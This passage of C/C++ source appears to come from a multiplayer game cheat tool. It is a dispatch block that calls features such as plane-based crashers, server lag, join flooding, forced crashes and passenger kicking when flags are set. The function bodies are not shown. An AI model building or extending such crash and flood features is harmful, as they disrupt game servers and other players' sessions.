		|| OLCheats->bPlaneCrasher)
		OL_VortexPlaneCrasher();
	if (OLCheats->bVortexCrasher2
		|| OLCheats->bPlaneCrasher2)
		OL_VortexPlaneCrasher2();

	if (OLCheats->bAutoScroll)
		OL_AutoScroll();

	if (OLCheats->bInvisibleBike2)
		OL_InvisibleBike2();

	if (OLCheats->bAutoCBug)
		OL_AutoCBug();

	if (OLCheats->bSlapper)
		OL_Slapper();

		OL_RenderFinder();
	if (OLCheats->bElevator)
		OL_Elevator();
	if (OLCheats->bJetpackElevator)
		OL_Jetpack_Elevator();
	if (OLCheats->bServerLag)
		OL_ServerLag();
	if (OLCheats->bJoinFlood)
		OL_JoinFlood();
	if (OLCheats->bNoFall)
		OL_NoFall();
	if (OLCheats->bKickPassenger)
		KickPassenger();
	if (OLCheats->bStealPassenger)
		StealPassenger();

	if (OLCheats->bUseNearestTarget
		&& (OLCheats->bIsVehCheatActive || OLCheats->bIsPlayerCheatActive))
		NearestTarget();

	
	if (OLCheats->bOL_Crash)
		OL_ForceCrash();
	
	//if (OLCheats->bJoinFlood2)
	//	OL_JoinFlood2();
	if(OLCheats->bAntiLoading)
		Anti_Loading();


	//GetDamageHit();
	
	//if (OLCheats->bCarShooter)
	//OL_FakePing();

}